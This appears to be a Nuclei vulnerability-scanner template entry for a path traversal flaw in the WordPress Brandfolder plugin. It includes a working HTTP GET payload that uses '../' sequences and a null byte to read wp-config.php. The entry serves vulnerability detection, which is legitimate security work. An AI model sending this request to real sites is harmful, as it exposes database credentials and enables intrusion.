# Nuclei Template: Wordpress Brandfolder - Remote/Local File Inclusion
**Template ID:** brandfolder-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`brandfolder-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Brandfolder allows remote attackers to access arbitrary files that reside on the local and remote server and disclose their content.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00
```

## References
- https://www.exploit-db.com/exploits/39591
- https://cxsecurity.com/issue/WLB-2016030120
